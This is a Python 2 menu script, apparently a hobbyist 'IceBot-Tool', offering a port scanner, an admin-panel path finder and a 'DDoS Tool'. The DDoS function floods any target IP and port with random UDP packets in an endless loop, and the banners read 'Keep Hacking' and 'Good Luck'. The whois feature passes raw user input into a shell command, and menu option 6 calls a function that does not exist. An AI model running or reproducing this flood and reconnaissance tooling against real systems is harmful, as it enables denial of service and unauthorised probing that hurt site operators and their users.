#!/usr/bin/python
import random
import sys
import os
import socket
import time
from urllib2 import Request, urlopen, URLError, HTTPError
from colors import *



#############################################


def PortScanner():
    os.system("clear")
    os.system("figlet Port Scanner")
    server = raw_input("Server To Scan: ")
    serverip = socket.gethostbyname(server)
############################################
    os.system("clear")
    os.system("figlet SCANNING...")
############################################
    print "----------------------------------+"
    print "Scanning Host: ",  serverip, "   +"
    print "----------------------------------+"
############################################
    c=0
    try:
        for i in range(1,1025):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((serverip,i))
            if result == 0:
                c = c + 1
                print "Port: {}  OPEN".format(i)
            sock.close() 
############################################
        print c, ":" "Opened Ports"
############################################
    except KeyboardInterrupt:
        print "\n"
        print "you pressed Ctrl+C"
        sys.exit()

##################

def findAdmin():
        os.system("clear")
        os.system("figlet Admin Panel Finder")
	f = open("link.txt","r");
	link = raw_input("Enter WebSite Name: ")
	print "\n\nAvilable links : \n"
	while True:
		sub_link = f.readline()
		if not sub_link:
			break
		req_link = "http://"+link+"/"+sub_link
		req = Request(req_link)
		try:
			response = urlopen(req)
		except HTTPError as e:
			continue
		except URLError as e:
			continue
		else:
			print "OK => ",req_link
##################################################
##################################################

def DDoS():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(2048)
    ############################
    #############################
    os.system("clear")
    os.system("figlet IceBot-DDOS")
    time.sleep(2)
    os.system("clear")
    os.system("figlet DDOS-IceBot")
    time.sleep(2)
    os.system("clear")
    ##############################
    os.system("figlet Keep Hacking")
    ##############################
    print
    ip = raw_input("Target IP : ")
    port = input("Target Port : ")
    ##############################
    os.system("clear")
    for i in range(2):
	    os.system("figlet Good Luck")
	    time.sleep(1)
	    os.system("clear")
	    os.system("figlet Good Luck.")
	    time.sleep(1)
	    os.system("clear")
	    os.system("figlet Good Luck..")
	    time.sleep(1)
	    os.system("clear")
	    os.system("figlet Good Luck...")
	    time.sleep(1)
	    os.system("clear")
      ################################
    sent = 0
    try:
        while True:
            sock.sendto(bytes, (ip,port))
            sent = sent + 1

            print "Sent: %s packet to: %s throught port:%s"%(sent,ip,port)
    except KeyboardInterrupt:
        print "exiting"

#################
def Update():
    os.system("clear")
    os.system("figlet Update")
    os.system("apt-get update && apt-get upgrade && apt-get dist-upgrade -y")
    os.system("clear")
    os.system("figlet Updated")

def termux():
    os.system("clear")
    os.system("figlet UPDATE")
    os.system("apt update && apt upgrade")
    os.system("clear")
    os.system("figlet UPDATED")
    os.system("ls")

def webSiteInfo():
        os.system("clear")
        server = raw_input("WebSite: ")
        ip = socket.gethostbyname(server)
        print server, "----->", ip
        command = 'whois '+ server
        process = os.popen(command)
        info = str(process.read())
        print info
#################
print ga.red
os.system("clear")
print "#####################################"
print "#   +++     IceBot-Tool v1    +++   #"
print "#    +    Scripts by icebot    +    #"
print "#   +++    WHITE-HAT-HACKER   +++   #"
print "#####################################"
print "\n"
print ga.green
os.system("figlet IceBot-Tool")
print "[1]  Port Scanner"
print "[2]  Admin Panel Finder"
print "[3]  DDoS Tool"
print "[4]  Linux Update"
print "[5]  Termux Update"
print "[6]  Find a WebSite's IP"
print "\n" 

tool = input("---->")

if tool == 1:
    PortScanner()

elif tool == 2:
    findAdmin()

elif tool == 3:
    DDoS()
   
elif tool == 4:
    Update()
    
elif tool == 5:
    termux()    

elif tool == 6:
    ip()
